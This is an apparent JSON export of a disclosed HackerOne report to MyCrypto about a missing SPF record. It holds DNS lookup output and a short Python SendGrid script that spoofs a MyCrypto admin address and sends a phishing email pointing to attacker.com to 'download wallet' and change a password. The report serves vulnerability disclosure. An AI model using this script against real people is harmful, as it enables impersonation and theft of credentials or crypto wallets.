{"id":325734,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjU3MzQ=","url":"https://hackerone.com/reports/325734","title":"Missing SPF record for the in scope domain","state":"Closed","substate":"duplicate","severity_rating":"medium","readable_substate":"Duplicate","created_at":"2018-03-13T20:47:42.611Z","submitted_at":"2018-03-13T20:47:42.611Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"nitesculucian","url":"/nitesculucian","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/194/421/0ea95e6a0bc189b61a72b675d0011c4e8c005516_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22750,"url":"https://hackerone.com/mycrypto","handle":"mycrypto","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/022/750/bb6071d69f26459ef3aebe0ae25d6b0ff95ff720_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/750/bb6071d69f26459ef3aebe0ae25d6b0ff95ff720_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"MyCrypto","twitter_handle":"mycrypto","website":"https://mycrypto.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-05-24T01:29:59.371Z","bug_reporter_agreed_on_going_public_at":"2018-03-14T22:31:44.160Z","team_member_agreed_on_going_public_at":"2018-05-24T01:29:59.304Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"```\nnli@nlistation:~$ dig mycrypto.com txt\n\n; \u003c\u003c\u003e\u003e DiG 9.10.3-P4-Ubuntu \u003c\u003c\u003e\u003e mycrypto.com txt\n;; global options: +cmd\n;; Got answer:\n;; -\u003e\u003eHEADER\u003c\u003c- opcode: QUERY, status: NOERROR, id: 43571\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n;; QUESTION SECTION:\n;mycrypto.com.\t\t\tIN\tTXT\n\n;; AUTHORITY SECTION:\nmycrypto.com.\t\t10800\tIN\tSOA\tns-1945.awsdns-51.co.uk. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400\n\n;; Query time: 37 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1)\n;; WHEN: Tue Mar 13 22:37:32 EET 2018\n;; MSG SIZE  rcvd: 125\n```\nInstead of: \n\n```\nnli@nlistation:~$ dig gmail.com txt\n\n; \u003c\u003c\u003e\u003e DiG 9.10.3-P4-Ubuntu \u003c\u003c\u003e\u003e gmail.com txt\n;; global options: +cmd\n;; Got answer:\n;; -\u003e\u003eHEADER\u003c\u003c- opcode: QUERY, status: NOERROR, id: 19223\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n;; QUESTION SECTION:\n;gmail.com.\t\t\tIN\tTXT\n\n;; ANSWER SECTION:\ngmail.com.\t\t300\tIN\tTXT\t\"v=spf1 redirect=_spf.google.com\"\n\n;; Query time: 52 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1)\n;; WHEN: Tue Mar 13 22:37:49 EET 2018\n;; MSG SIZE  rcvd: 82\n\n```\nWhere you can observe \"v=spf1 redirect=_spf.google.com\". Further more  this is a functional exploit for this issue (you still need an API key):\n\n```\nimport sendgrid\nimport os\nfrom sendgrid.helpers.mail import *\n \nsg = sendgrid.SendGridAPIClient(apikey=os.environ.get('SENDGRID_API_KEY'))\nfrom_email = Email(\"legit-admin@mycrypto.com\")\nto_email = Email(\"Your email\")\nsubject = \"Please Change your Password\"\ncontent = Content(\"text/plain\", \"Message From Admin ,Download Wallet from https://attacker.com, Change your password at https://attacker.com\")\nmail = Mail(from_email, subject, to_email, content)\nresponse = sg.client.mail.send.post(request_body=mail.get())\nprint(response.status_code)\nprint(response.body)\nprint(response.headers)\n```\nYou can also send from a web server or something else of your choosing.\n\n## Impact\n\nMissing SPF record for the in scope domain allows attackers to impersonate emails in order to send targeted phishing emails. This is rather common for ICO's or targeted attacks.","vulnerability_information_html":"\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003enli@nlistation:~$ dig mycrypto.com txt\n\n; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.10.3-P4-Ubuntu \u0026lt;\u0026lt;\u0026gt;\u0026gt; mycrypto.com txt\n;; global options: +cmd\n;; Got answer:\n;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 43571\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n;; QUESTION SECTION:\n;mycrypto.com.          IN  TXT\n\n;; AUTHORITY SECTION:\nmycrypto.com.       10800   IN  SOA ns-1945.awsdns-51.co.uk. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400\n\n;; Query time: 37 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1)\n;; WHEN: Tue Mar 13 22:37:32 EET 2018\n;; MSG SIZE  rcvd: 125\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eInstead of: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003enli@nlistation:~$ dig gmail.com txt\n\n; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.10.3-P4-Ubuntu \u0026lt;\u0026lt;\u0026gt;\u0026gt; gmail.com txt\n;; global options: +cmd\n;; Got answer:\n;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 19223\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 4096\n;; QUESTION SECTION:\n;gmail.com.         IN  TXT\n\n;; ANSWER SECTION:\ngmail.com.      300 IN  TXT \u0026quot;v=spf1 redirect=_spf.google.com\u0026quot;\n\n;; Query time: 52 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1)\n;; WHEN: Tue Mar 13 22:37:49 EET 2018\n;; MSG SIZE  rcvd: 82\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhere you can observe \u0026quot;v=spf1 redirect=_spf.google.com\u0026quot;. Further more  this is a functional exploit for this issue (you still need an API key):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eimport sendgrid\nimport os\nfrom sendgrid.helpers.mail import *\n\nsg = sendgrid.SendGridAPIClient(apikey=os.environ.get(\u0026#39;SENDGRID_API_KEY\u0026#39;))\nfrom_email = Email(\u0026quot;legit-admin@mycrypto.com\u0026quot;)\nto_email = Email(\u0026quot;Your email\u0026quot;)\nsubject = \u0026quot;Please Change your Password\u0026quot;\ncontent = Content(\u0026quot;text/plain\u0026quot;, \u0026quot;Message From Admin ,Download Wallet from https://attacker.com, Change your password at https://attacker.com\u0026quot;)\nmail = Mail(from_email, subject, to_email, content)\nresponse = sg.client.mail.send.post(request_body=mail.get())\nprint(response.status_code)\nprint(response.body)\nprint(response.headers)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou can also send from a web server or something else of your choosing.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eMissing SPF record for the in scope domain allows attackers to impersonate emails in order to send targeted phishing emails. This is rather common for ICO\u0026#39;s or targeted attacks.\u003c/p\u003e\n","weakness":{"id":73,"name":"Phishing"},"original_report_id":324168,"original_report_url":"https://hackerone.com/reports/324168","attachments":[{"id":272151,"file_name":"Selection_040.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/272/151/ebd0d92ccc92142e40a843ed01b5f74cc66169db/Selection_040.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_040.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_040.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6SZWJ7EV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053543Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDnUzI%2BFGOFBLAScWuVOL4Lj3JmbbQAzP3Z0CGixtLCuAIgQzjjEEfRLfyvyTUcWPuh1TmLwtvXfhn4Y1cmYaMrO6cqtAMIVRABGgwwMTM2MTkyNzQ4NDkiDGp%2BpnVA5musWTL7NCqRA8%2FtWDfuTNl%2BTEZ8%2F83sOgEjGfhPO7hqas9S5YFvyrG29udKPmtcuewMHQFGoWh6uvbSTE9LPEkFDl6RosJJJY3ZsFaD9BGxtIOBINUPfZd26XnOL01fuCQ8x%2BiErJvv8vHBR5mWXV7L6t7A2%2F5H8dY91iEQFmPdZboRnRed4t2q9jcZCwrkzHwMk8bNRFkfRqzqUB6%2Buk39e4oyKwiyqROwDwnoUxIOrVdA29STuUYzszGBQ%2B3Eg%2Fr4I9Ys7sDaoYDHJAVEt%2F6kVnewTLU3uHfL%2F%2FzDR0ZnJa5Oo%2BmValn4%2Fn34Ke7o7csnn3piiGYIK4mihEWUVtJZnq0bZ%2BEU14q4ZLfb79tvTTKy5%2B9XC3vM1tWdFU6K%2F2PISAY5LoVEscNgJL0aQIq7sAX0f00Uyo2TeQTR%2B9TUOeUvW40metpNAt6ZQ8u0%2BuTZij%2FLNaYEe6v5RA7Fg8wzm%2Bu7IVusddMT4HgUuba3afxdFVj8x9iXROa6QZZ%2BdlHYNGywE8eJxO3jkpwbaZpUg8PZ17ztcb5%2BMLHSqv8FOusBshs3Z1RNetRK0o6yVAL2zGdldUlxbnMrusEP31v5WyfcSXKYrW1oJGSAAOlTEHZOawyDOEVKZdmLftLsa7vpv4NkkvDc0MjvNZjQrLWiuTmEalVC704buBLYftchmedTLOrsCMIpwWkxoPJnEqO2VZwPnup4B1lMH%2B%2FHO0btRwbDEfX1bZu7nae%2FPoCvN9o%2FT1iQ8GcaSv5OUJxppuy2cagjSuiUWEkOXPhYiBKpxTQMFIMtd6%2FpRtJ2YeCQgmRXXl1K6ayBDQAQxWFeKQPM5vtrAzDrzE9Adaqtb3AdlxqDjg74xdcM9YFdyg%3D%3D\u0026X-Amz-Signature=7920373611f22f4ee711713287d338f82d1cd79949eb7b57579422608942262b","file_size":24545,"type":"image/png"},{"id":272152,"file_name":"Selection_041.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/272/152/949e6d60107a8e9444168fdcf5fe043b8b799d32/Selection_041.png?response-content-disposition=attachment%3B%20filename%3D%22Selection_041.png%22%3B%20filename%2A%3DUTF-8%27%27Selection_041.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6SZWJ7EV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053543Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDnUzI%2BFGOFBLAScWuVOL4Lj3JmbbQAzP3Z0CGixtLCuAIgQzjjEEfRLfyvyTUcWPuh1TmLwtvXfhn4Y1cmYaMrO6cqtAMIVRABGgwwMTM2MTkyNzQ4NDkiDGp%2BpnVA5musWTL7NCqRA8%2FtWDfuTNl%2BTEZ8%2F83sOgEjGfhPO7hqas9S5YFvyrG29udKPmtcuewMHQFGoWh6uvbSTE9LPEkFDl6RosJJJY3ZsFaD9BGxtIOBINUPfZd26XnOL01fuCQ8x%2BiErJvv8vHBR5mWXV7L6t7A2%2F5H8dY91iEQFmPdZboRnRed4t2q9jcZCwrkzHwMk8bNRFkfRqzqUB6%2Buk39e4oyKwiyqROwDwnoUxIOrVdA29STuUYzszGBQ%2B3Eg%2Fr4I9Ys7sDaoYDHJAVEt%2F6kVnewTLU3uHfL%2F%2FzDR0ZnJa5Oo%2BmValn4%2Fn34Ke7o7csnn3piiGYIK4mihEWUVtJZnq0bZ%2BEU14q4ZLfb79tvTTKy5%2B9XC3vM1tWdFU6K%2F2PISAY5LoVEscNgJL0aQIq7sAX0f00Uyo2TeQTR%2B9TUOeUvW40metpNAt6ZQ8u0%2BuTZij%2FLNaYEe6v5RA7Fg8wzm%2Bu7IVusddMT4HgUuba3afxdFVj8x9iXROa6QZZ%2BdlHYNGywE8eJxO3jkpwbaZpUg8PZ17ztcb5%2BMLHSqv8FOusBshs3Z1RNetRK0o6yVAL2zGdldUlxbnMrusEP31v5WyfcSXKYrW1oJGSAAOlTEHZOawyDOEVKZdmLftLsa7vpv4NkkvDc0MjvNZjQrLWiuTmEalVC704buBLYftchmedTLOrsCMIpwWkxoPJnEqO2VZwPnup4B1lMH%2B%2FHO0btRwbDEfX1bZu7nae%2FPoCvN9o%2FT1iQ8GcaSv5OUJxppuy2cagjSuiUWEkOXPhYiBKpxTQMFIMtd6%2FpRtJ2YeCQgmRXXl1K6ayBDQAQxWFeKQPM5vtrAzDrzE9Adaqtb3AdlxqDjg74xdcM9YFdyg%3D%3D\u0026X-Amz-Signature=7bf442fc19f18dc464e583c806a9f9f94cf0e30819f9801a4001431790d963b2","file_size":32636,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":2,"voters":["mygf","an0nym0us"],"severity":{"rating":"medium","score":6.4,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":6528,"asset_type":"URL","asset_identifier":"www.mycrypto.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2492568,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hello,\n\nWe are in-progress of finding a solution to a similar issue.\n\nThank you for the disclosure.\n\nBest,\nDaniel","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eWe are in-progress of finding a solution to a similar issue.\u003c/p\u003e\n\n\u003cp\u003eThank you for the disclosure.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nDaniel\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-14T17:58:25.263Z","updated_at":"2018-03-14T17:58:25.263Z","original_report_id":324168,"actor":{"username":"dternyak","cleared":false,"url":"/dternyak","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mycrypto","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2493257,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-14T22:31:44.198Z","updated_at":"2018-03-14T22:31:44.198Z","first_to_agree":true,"actor":{"username":"nitesculucian","cleared":false,"url":"/nitesculucian","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/194/421/0ea95e6a0bc189b61a72b675d0011c4e8c005516_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mycrypto","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2789329,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-24T01:29:59.337Z","updated_at":"2018-05-24T01:29:59.337Z","actor":{"username":"dternyak","cleared":false,"url":"/dternyak","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mycrypto","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2789330,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-24T01:29:59.761Z","updated_at":"2018-05-24T01:29:59.761Z","actor":{"username":"dternyak","cleared":false,"url":"/dternyak","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mycrypto","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}